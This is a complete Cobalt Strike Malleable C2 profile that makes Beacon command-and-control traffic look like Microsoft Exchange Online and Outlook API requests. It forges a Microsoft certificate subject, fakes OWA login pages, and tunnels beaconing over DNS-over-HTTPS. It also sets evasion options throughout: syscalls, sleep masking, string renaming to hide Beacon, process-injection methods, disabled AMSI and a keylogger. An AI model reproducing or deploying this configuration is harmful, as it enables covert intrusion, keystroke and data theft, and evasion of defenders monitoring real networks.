# Malleable C2 Profile - Microsoft 365 Exchange / Outlook theme
# CS 4.12+ / Beacon Booster compatible
# Simulates Exchange Online / Outlook REST API traffic
# Target scenario: fenix-a

set sample_name "Microsoft Exchange Online";
set data_jitter "72";
set host_stage "false";
set tasks_max_size "104857600";
set pipename "Microsoft_##_##_############";
set pipename_stager "MailSync_###";
set smb_frame_header "";
set ssh_banner "OpenSSH_8.7p1 RHEL-3";

set sleeptime "45000";
set jitter "40";

set ssh_pipename "outlook_sync_####";
set tcp_frame_header "";
set tcp_port "9443";

set headers_remove "";
set steal_token_access_mask "11";
set tasks_proxy_max_size "94371840";
set tasks_dns_proxy_max_size "71680";

dns-beacon {
    set maxdns "255";
    set dns_idle "0.0.0.0";
    set dns_max_txt "252";
    set dns_sleep "0";
    set dns_stager_prepend "";
    set dns_stager_subhost ".mail.645281.";
    set dns_ttl "1";

    set beacon         "mx.ns.";
    set get_A          "mx.qa.";
    set get_AAAA       "mx.v6.";
    set get_TXT        "mx.vf.";
    set put_metadata   "mx.hd.";
    set put_output     "mx.dt.";

    set ns_response "zero";

    set comm_mode "dns-over-https";
    dns-over-https {
        set doh_verb           "POST";
        set doh_useragent      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0";
        set doh_proxy_server   "";
        set doh_server         "cloudflare-dns.com";
        set doh_accept         "application/dns-message";
        header "Content-Type"  "application/dns-message";
    }
}

http-config {
    set headers "Date, Server, Content-Length, Connection, Content-Type, X-Powered-By";
    header "Server" "Microsoft-IIS/10.0";
    header "X-Powered-By" "ASP.NET";
    header "Connection" "keep-alive";
    set trust_x_forwarded_for "true";
    set block_useragents "curl*,lynx*,wget*";
    set allow_useragents "";
}

https-certificate {
    set C "US";
    set CN "*.outlook.office365.com";
    set L "Redmond";
    set OU "Microsoft 365";
    set O "Microsoft Corporation";
    set ST "WA";
    set validity "365";
}

http-stager {
    set uri_x86 "/owa/auth/logon.aspx";
    set uri_x64 "/owa/auth/signin";

    client {
        parameter "realm" "office365.com";
        parameter "whr" "office365.com";
    }

    server {
        header "Content-Type" "text/html; charset=utf-8";
        header "X-OWA-Version" "15.20.7452.049";
        header "X-Frame-Options" "SAMEORIGIN";
        output {
            prepend "<!DOCTYPE html><html><head><title>Outlook</title></head><body class=\"signInPage\"><div id=\"content\">";
            append "</div></body></html>\n";
            print;
        }
    }
}

set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0";

# GET - mimics Exchange Online REST API
http-get {
    set uri "/api/v2.0/me/messages";

    client {
        header "Accept" "application/json; odata.metadata=minimal";
        header "Accept-Encoding" "gzip, deflate, br";
        header "Accept-Language" "en-US";
        header "Sec-Fetch-Site" "same-origin";
        header "Sec-Fetch-Mode" "cors";
        header "Sec-Fetch-Dest" "empty";
        header "X-AnchorMailbox" "user@outlook.com";

        metadata {
            mask;
            base64url;
            prepend "X-OWA-CANARY=";
            header "Cookie";
        }

        parameter "$select" "subject,from,receivedDateTime";
        parameter "$top" "25";
        parameter "$orderby" "receivedDateTime desc";
    }

    server {
        header "Content-Type" "application/json; odata.metadata=minimal; odata.streaming=true";
        header "X-OWA-Version" "15.20.7452.049";
        header "X-CalculatedBETarget" "MWHPR11MB4926.namprd11.prod.outlook.com";
        header "X-MS-Exchange-Organization-AuthAs" "Internal";

        output {
            mask;
            base64;
            prepend "{\"@odata.context\":\"https://outlook.office365.com/api/v2.0/$metadata#Me/Messages\",\"value\":[{\"Id\":\"";
            append "\"}]}\n";
            print;
        }
    }
}

# POST - mimics Exchange Online send/draft API
http-post {
    set uri "/api/v2.0/me/sendmail";
    set verb "POST";
    set client_max_post_get_packet "4096";

    client {
        header "Content-Type" "application/json; charset=utf-8";
        header "Accept" "application/json";
        header "Accept-Encoding" "gzip, deflate, br";
        header "Sec-Fetch-Site" "same-origin";
        header "Sec-Fetch-Mode" "cors";
        header "X-AnchorMailbox" "user@outlook.com";

        output {
            mask;
            base64url;
            uri-append;
        }

        id {
            mask;
            base64url;
            prepend "{\"Message\":{\"Subject\":\"Re: Weekly sync\",\"MessageId\":\"";
            append "\"},\"SaveToSentItems\":true}\n";
            print;
        }
    }

    server {
        header "Content-Type" "application/json; charset=utf-8";
        header "X-OWA-Version" "15.20.7452.049";
        header "X-MS-Exchange-Organization-AuthAs" "Internal";

        output {
            mask;
            base64;
            prepend "{\"@odata.context\":\"https://outlook.office365.com/api/v2.0/$metadata#message\",\"Id\":\"";
            append "\",\"ChangeKey\":\"CQAAABYAAABhHrbETg\"}\n";
            print;
        }
    }
}

http-beacon {
    set library "winhttp";
    set data_required "true";
    set data_required_length "128-384";
}

stage {

    set checksum "0";
    set data_store_size "16";

    set copy_pe_header         "true";
    set eaf_bypass             "true";
    set rdll_loader            "PrependLoader";
    set rdll_use_syscalls      "true";
    set rdll_use_driploading   "true";
    set rdll_dripload_delay    "100";

    # Beacon Booster compatible: no transform-obfuscate, no prepend/append in stage transforms

    transform-x86 {
        strrep "ReflectiveLoader" "ExchangeSync";
        strrep "beacon.x64.dll" "outlk64.dll";
        strrep "beacon.dll" "outlk.dll";
    }

    transform-x64 {
        strrep "ReflectiveLoader" "ExchangeSync";
        strrep "beacon.x64.dll" "outlk64.dll";
        strrep "beacon.dll" "outlk.dll";
    }

    stringw "Exchange Online Module";

    set allocator "VirtualAlloc";
    set cleanup "true";
    set magic_pe "PE";
    set obfuscate "true";
    set sleep_mask "true";
    set syscall_method "Indirect";

    beacon_gate {
      Comms;
    }

    set smartinject "false";
    set stomppe "true";
    set userwx "false";

    set compile_time "18 Jan 2024 11:07:00";
    set entry_point "86512";

}

process-inject {

    set allocator "VirtualAllocEx";
    set use_driploading   "true";
    set dripload_delay    "100";

    set min_alloc "16384";
    set startrwx "false";
    set userwx "false";

    set bof_allocator "VirtualAlloc";
    set bof_reuse_memory "true";

    transform-x86 {
        prepend "\x90\x90";
    }

    transform-x64 {
    }

    execute {
        ObfSetThreadContext;
        CreateThread "ntdll.dll!RtlUserThreadStart";
        SetThreadContext;
        NtQueueApcThread-s;
        NtQueueApcThread;
        CreateRemoteThread;
        RtlCreateUserThread;
    }
}

post-ex {
    set spawnto_x86 "%windir%\\syswow64\\SearchProtocolHost.exe";
    set spawnto_x64 "%windir%\\sysnative\\SearchProtocolHost.exe";

    set obfuscate "true";
    set pipename "OfficeHubHL_####, OfficeC2RClient_###";
    set smartinject "true";
    set amsi_disable "true";
    set keylogger "GetAsyncKeyState";
    set cleanup "true";

    transform-x64 {
        strrepex "PortScanner" "Scanner module is complete" "Sync complete";
        strrep "is alive." "is found.";
    }

    transform-x86 {
        strrepex "PortScanner" "Scanner module is complete" "Sync complete";
        strrep "is alive." "is found.";
    }
}
